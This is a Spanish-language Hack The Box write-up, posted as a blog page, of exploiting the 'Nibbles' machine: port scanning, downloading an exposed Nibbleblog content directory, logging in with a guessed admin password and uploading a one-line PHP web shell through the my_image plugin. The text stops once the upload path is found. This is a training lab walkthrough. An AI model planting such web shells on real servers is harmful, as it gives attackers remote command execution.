@@ -1,0 +1,867 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Nibbles - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Nibbles en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Nibbles">
+<meta property="og:url" content="http://localhost:4000/htb-nibbles/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Nibbles en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-nibbles/nibbles.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-18T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-nibbles/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Nibbles</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Nibbles">
+    <meta itemprop="description" content="Resolución de la máquina Nibbles en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="March 18, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Nibbles
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-18T00:00:00-06:00">March 18, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-nibbles/banner-nibbles.jpg" alt=""></p>
+
+<h2 id="nibbles">Nibbles</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.75.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.75
+PING 10.10.10.75 <span class="o">(</span>10.10.10.75<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.75: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>136 ms
+
+<span class="nt">---</span> 10.10.10.75 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.306/136.306/136.306/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.75 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-18 00:37 CST
+Initiating Ping Scan at 00:37
+Scanning 10.10.10.75 <span class="o">[</span>4 ports]
+Completed Ping Scan at 00:37, 0.17s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 00:37
+Scanning 10.10.10.75 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.75
+Discovered open port 80/tcp on 10.10.10.75
+Completed SYN Stealth Scan at 00:38, 37.05s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.75
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>37.36 seconds
+           Raw packets sent: 68935 <span class="o">(</span>3.033MB<span class="o">)</span> | Rcvd: 68928 <span class="o">(</span>2.757MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 116 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.75
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.75 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-18 00:38 CST
+Nmap scan report <span class="k">for </span>10.10.10.75
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
+</span></code></pre></div></div>
+
+<p>Vemos el puerto 80 abierto, por lo que ocuparemos la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> para ver a lo que nos enfrentamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.75/
+http://10.10.10.75/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.75]
+</code></pre></div></div>
+
+<p>No tenemos nada interesante, así que visualizaremos el contenido vía web.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web.png" alt=""></p>
+
+<p>Si vemos el código fuente de la página web, nos encontramos con un comentario en donde se nos muestra el recurso <code class="language-plaintext highlighter-rouge">/nibbleblog/</code>:</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web1.png" alt=""></p>
+
+<p>Si ingresamos a dicho recurso, poca cosa vemos.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web2.png" alt=""></p>
+
+<p>Ahora, vamos a tratar de descubrir recursos en el servidor web  con la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">--script-args</span> http-enum.basepath<span class="o">=</span><span class="s2">"nibbleblog"</span> <span class="nt">-p80</span> 10.10.10.75 <span class="nt">-oN</span> webScan_nibbleblog
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-18 00:46 CST
+Nmap scan report <span class="k">for </span>10.10.10.75
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /nibbleblog/admin.php: Possible admin folder
+|   /nibbleblog/admin/: Possible admin folder
+|   /nibbleblog/README: Interesting, a readme.
+|   /nibbleblog/content/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.18 (ubuntu)'</span>
+|_  /nibbleblog/themes/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.18 (ubuntu)'</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.16 seconds
+</code></pre></div></div>
+
+<p>Un recurso interesante que ya nos llamada la atención es <code class="language-plaintext highlighter-rouge">/content</code>, <code class="language-plaintext highlighter-rouge">/admin/</code> y <code class="language-plaintext highlighter-rouge">/admin.php</code>. Primero vamos a checar <code class="language-plaintext highlighter-rouge">/content/</code> y se trata de un listado de directorios.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web3.png" alt=""></p>
+
+<p>Para trabajar más cómodos, vamos a traernos los recursos de dicho directorio a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget <span class="nt">-r</span> <span class="nt">--no-passive</span> <span class="nt">--no-parent</span> http://10.10.10.75/nibbleblog/content/ <span class="nt">-R</span> <span class="s2">"index.html*"</span>                                       <span class="nt">--2022-03-18</span> 01:03:26--  http://10.10.10.75/nibbleblog/content/                                                                  
+Conectando con 10.10.10.75:80... conectado.                                                                                      
+Petición HTTP enviada, esperando respuesta... 200 OK                                                                             
+Longitud: 1353 <span class="o">(</span>1.3K<span class="o">)</span> <span class="o">[</span>text/html]                                                                                                
+Grabando a: «10.10.10.75/nibbleblog/content/index.html.tmp»                                                                      
+                                                                                                                                 
+10.10.10.75/nibbleblog/content/i 100%[<span class="o">=======================================================&gt;]</span>   1.32K  <span class="nt">--</span>.-KB/s    en 0s       
+                                                                                                                                 
+2022-03-18 01:03:26 <span class="o">(</span>185 MB/s<span class="o">)</span> - «10.10.10.75/nibbleblog/content/index.html.tmp» guardado <span class="o">[</span>1353/1353]                            
+                                                                                                                                 
+Cargando robots.txt<span class="p">;</span> por favor ignore los errores.                                                                               
+<span class="nt">--2022-03-18</span> 01:03:26--  http://10.10.10.75/robots.txt                                                                           
+Reutilizando la conexión con 10.10.10.75:80.                                                                                     
+Petición HTTP enviada, esperando respuesta... 404 Not Found                                                                      
+2022-03-18 01:03:27 ERROR 404: Not Found.                                                                                        
+                                                                                                                                 
+Eliminando 10.10.10.75/nibbleblog/content/index.html.tmp puesto que debería ser rechazado.
+<span class="nt">---</span>
+<span class="nt">--2022-03-18</span> 01:03:47--  http://10.10.10.75/nibbleblog/content/private/plugins/pages/?C<span class="o">=</span>D<span class="p">;</span><span class="nv">O</span><span class="o">=</span>D                                    
+Reutilizando la conexión con 10.10.10.75:80.                                                                                     
+Petición HTTP enviada, esperando respuesta... 200 OK                                                                             
+Longitud: 1036 <span class="o">(</span>1.0K<span class="o">)</span> <span class="o">[</span>text/html]                                                                                                
+Grabando a: «10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C<span class="o">=</span>D<span class="p">;</span><span class="nv">O</span><span class="o">=</span>D.tmp»                                        
+                                                                                                                                 
+10.10.10.75/nibbleblog/content/p 100%[<span class="o">=======================================================&gt;]</span>   1.01K  <span class="nt">--</span>.-KB/s    en 0s      
+
+2022-03-18 01:03:47 <span class="o">(</span>112 MB/s<span class="o">)</span> - «10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C<span class="o">=</span>D<span class="p">;</span><span class="nv">O</span><span class="o">=</span>D.tmp» guardado <span class="o">[</span>1036/103
+6]
+
+Eliminando 10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C<span class="o">=</span>D<span class="p">;</span><span class="nv">O</span><span class="o">=</span>D.tmp puesto que debería ser rechazado.
+
+ACABADO <span class="nt">--2022-03-18</span> 01:03:47--
+Tiempo total de reloj: 21s
+Descargados: 144 ficheros, 272K en 0.1s <span class="o">(</span>1.86 MB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Ya podemos ver de una formas más cómoda los recursos dentro de la carpeta <code class="language-plaintext highlighter-rouge">/content/</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree
+<span class="nb">.</span>
+└── 10.10.10.75
+    └── nibbleblog
+        └── content
+            ├── private
+            │   ├── categories.xml
+            │   ├── comments.xml
+            │   ├── config.xml
+            │   ├── keys.php
+            │   ├── notifications.xml
+            │   ├── pages.xml
+            │   ├── plugins
+            │   │   ├── categories
+            │   │   │   └── db.xml
+            │   │   ├── hello
+            │   │   │   └── db.xml
+            │   │   ├── latest_posts
+            │   │   │   └── db.xml
+            │   │   ├── my_image
+            │   │   │   └── db.xml
+            │   │   └── pages
+            │   │       └── db.xml
+            │   ├── posts.xml
+            │   ├── shadow.php
+            │   ├── tags.xml
+            │   └── users.xml
+            ├── public
+            │   ├── comments
+            │   ├── pages
+            │   ├── posts
+            │   └── upload
+            │       ├── nibbles_0_nbmedia.jpg
+            │       ├── nibbles_0_o.jpg
+            │       └── nibbles_0_thumb.jpg
+            └── tmp
+
+16 directories, 18 files
+❯ find <span class="se">\-</span><span class="nb">type </span>f
+./10.10.10.75/nibbleblog/content/private/categories.xml
+./10.10.10.75/nibbleblog/content/private/comments.xml
+./10.10.10.75/nibbleblog/content/private/config.xml
+./10.10.10.75/nibbleblog/content/private/keys.php
+./10.10.10.75/nibbleblog/content/private/notifications.xml
+./10.10.10.75/nibbleblog/content/private/pages.xml
+./10.10.10.75/nibbleblog/content/private/plugins/categories/db.xml
+./10.10.10.75/nibbleblog/content/private/plugins/hello/db.xml
+./10.10.10.75/nibbleblog/content/private/plugins/latest_posts/db.xml
+./10.10.10.75/nibbleblog/content/private/plugins/my_image/db.xml
+./10.10.10.75/nibbleblog/content/private/plugins/pages/db.xml
+./10.10.10.75/nibbleblog/content/private/posts.xml
+./10.10.10.75/nibbleblog/content/private/shadow.php
+./10.10.10.75/nibbleblog/content/private/tags.xml
+./10.10.10.75/nibbleblog/content/private/users.xml
+./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg
+./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_o.jpg
+./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_thumb.jpg
+</code></pre></div></div>
+
+<p>Un recurso que nos puede llamar la atención sería <code class="language-plaintext highlighter-rouge">keys.php</code>; sin embargo, no presenta contenido; así que vamos a checar el recurso <code class="language-plaintext highlighter-rouge">users.xml</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ./10.10.10.75/nibbleblog/content/private/users.xml                                                                         
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: ./10.10.10.75/nibbleblog/content/private/users.xml                                                                
+       │ Size: 503 B                                                                                                             
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
+   2   │ &lt;<span class="nb">users</span><span class="o">&gt;</span>&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"admin"</span><span class="o">&gt;</span>&lt;<span class="nb">id type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>0&lt;/id&gt;&lt;session_fail_count <span class="nb">type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>2&lt;/session_fail_count&gt;&lt;session
+       │ _date <span class="nb">type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>1647586085&lt;/session_date&gt;&lt;/user&gt;&lt;blacklist <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">ip</span><span class="o">=</span><span class="s2">"10.10.10.1"</span><span class="o">&gt;</span>&lt;<span class="nb">date type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>15129
+       │ 64659&lt;/date&gt;&lt;fail_count <span class="nb">type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>1&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;blacklist <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">ip</span><span class="o">=</span><span class="s2">"10.10.14.27"</span><span class="o">&gt;</span>&lt;<span class="nb">date type</span><span class="o">=</span><span class="s2">"i
+       │ nteger"</span><span class="o">&gt;</span>1647586081&lt;/date&gt;&lt;fail_count <span class="nb">type</span><span class="o">=</span><span class="s2">"integer"</span><span class="o">&gt;</span>3&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;/users&gt;
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Para verlo de una forma más cómoda, vamos a instalar <code class="language-plaintext highlighter-rouge">yq</code> con el comando <code class="language-plaintext highlighter-rouge">pip install yq</code> y posteriormente abrimos el archivo y al final agregamos <code class="language-plaintext highlighter-rouge">| xq</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ./10.10.10.75/nibbleblog/content/private/users.xml | xq
+<span class="o">{</span>
+  <span class="s2">"users"</span>: <span class="o">{</span>
+    <span class="s2">"user"</span>: <span class="o">{</span>
+      <span class="s2">"@username"</span>: <span class="s2">"admin"</span>,
+      <span class="s2">"id"</span>: <span class="o">{</span>
+        <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+        <span class="s2">"#text"</span>: <span class="s2">"0"</span>
+      <span class="o">}</span>,
+      <span class="s2">"session_fail_count"</span>: <span class="o">{</span>
+        <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+        <span class="s2">"#text"</span>: <span class="s2">"2"</span>
+      <span class="o">}</span>,
+      <span class="s2">"session_date"</span>: <span class="o">{</span>
+        <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+        <span class="s2">"#text"</span>: <span class="s2">"1647586085"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="s2">"blacklist"</span>: <span class="o">[</span>
+      <span class="o">{</span>
+        <span class="s2">"@type"</span>: <span class="s2">"string"</span>,
+        <span class="s2">"@ip"</span>: <span class="s2">"10.10.10.1"</span>,
+        <span class="s2">"date"</span>: <span class="o">{</span>
+          <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+          <span class="s2">"#text"</span>: <span class="s2">"1512964659"</span>
+        <span class="o">}</span>,
+        <span class="s2">"fail_count"</span>: <span class="o">{</span>
+          <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+          <span class="s2">"#text"</span>: <span class="s2">"1"</span>
+        <span class="o">}</span>
+      <span class="o">}</span>,
+      <span class="o">{</span>
+        <span class="s2">"@type"</span>: <span class="s2">"string"</span>,
+        <span class="s2">"@ip"</span>: <span class="s2">"10.10.14.27"</span>,
+        <span class="s2">"date"</span>: <span class="o">{</span>
+          <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+          <span class="s2">"#text"</span>: <span class="s2">"1647586081"</span>
+        <span class="o">}</span>,
+        <span class="s2">"fail_count"</span>: <span class="o">{</span>
+          <span class="s2">"@type"</span>: <span class="s2">"integer"</span>,
+          <span class="s2">"#text"</span>: <span class="s2">"3"</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">]</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Vemos el usuario <strong>admin</strong>, pero no vemos la contraseña. Por lo tanto, podriamos pensar que debe existir un panel de login, el cual se encuentra en <code class="language-plaintext highlighter-rouge">/admin.php</code>:</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web4.png" alt=""></p>
+
+<p>Podríamos tratar de utilizar contraseñas por defecto, como <strong>admin</strong>, <strong>passoword</strong>, <strong>admin123</strong> e incluso el nombre de la máquina (ya que esto es un CTF) y vemos que la contraseña es el propio nombre de la máquina para el usuario <strong>admin</strong>.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web5.png" alt=""></p>
+
+<p>A este punto, podríamos tratar de buscar exploits públicos asociados a <strong>nibbleblog</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit nibbleblog
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Nibbleblog 3 - Multiple SQL Injections                                                         | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload <span class="o">(</span>Metasploit<span class="o">)</span>                                          | php/remote/38489.rb
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Tenemos uno que nos puede llamar la atención <strong>Arbitrary File Upload (Metasploit)</strong> y como en este sitio no ocupamos metasploit, vamos a leerlo a ver de que forma realiza la explotación.</p>
+
+<div class="language-rb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span>
+<span class="n">vprint_status</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Uploading payload..."</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">(</span>
+      <span class="s1">'method'</span>        <span class="o">=&gt;</span> <span class="s1">'POST'</span><span class="p">,</span>
+      <span class="s1">'uri'</span>           <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="p">,</span> <span class="s1">'admin.php'</span><span class="p">),</span>
+      <span class="s1">'vars_get'</span>      <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="s1">'controller'</span>  <span class="o">=&gt;</span> <span class="s1">'plugins'</span><span class="p">,</span>
+        <span class="s1">'action'</span>      <span class="o">=&gt;</span> <span class="s1">'config'</span><span class="p">,</span>
+        <span class="s1">'plugin'</span>      <span class="o">=&gt;</span> <span class="s1">'my_image'</span>
+      <span class="p">},</span>
+      <span class="s1">'ctype'</span>         <span class="o">=&gt;</span> <span class="s2">"multipart/form-data; boundary=</span><span class="si">#{</span><span class="n">data</span><span class="p">.</span><span class="nf">bound</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
+      <span class="s1">'data'</span>          <span class="o">=&gt;</span> <span class="n">post_data</span><span class="p">,</span>
+      <span class="s1">'cookie'</span>        <span class="o">=&gt;</span> <span class="n">cookie</span>
+    <span class="p">)</span>
+<span class="o">---</span>
+</code></pre></div></div>
+
+<p>En esta parte nos indica algunos campos como <strong>plugins</strong>, <strong>config</strong> y <strong>my_image</strong> y si checamos vía web, vemos que podría tratarse de una ruta.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web6.png" alt=""></p>
+
+<p>Si la damos click en <strong>Configure</strong> dentro del campo <strong>My_image</strong>, vemos que podemos subir un archivo; sin embargo, no sabemos que tipo de archivos nos pueda permitir subir.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web7.png" alt=""></p>
+
+<p>Por lo tanto, vamos a tratar de ver si podemos subir un archivo php.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web8.png" alt=""></p>
+
+<p>En la parte de abajo nos debe aparecer un mensaje indicando que el archivo se subir exitosamente. Ahora debemos descubrir la ruta en donde se alojó nuestro archivo y si ponemos un poco de atención en lo que nos descargamos de el recurso <code class="language-plaintext highlighter-rouge">/content/</code>, vemos que bajo la ruta <code class="language-plaintext highlighter-rouge">/content/private/</code> existe un directorio llamado <strong>plugins</strong> y dentro de este se encuentra otro directorio de nombre <strong>my_image</strong>; por lo que es muy probable que ahí este nuestro archivo.</p>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web9.png" alt=""></p>
+
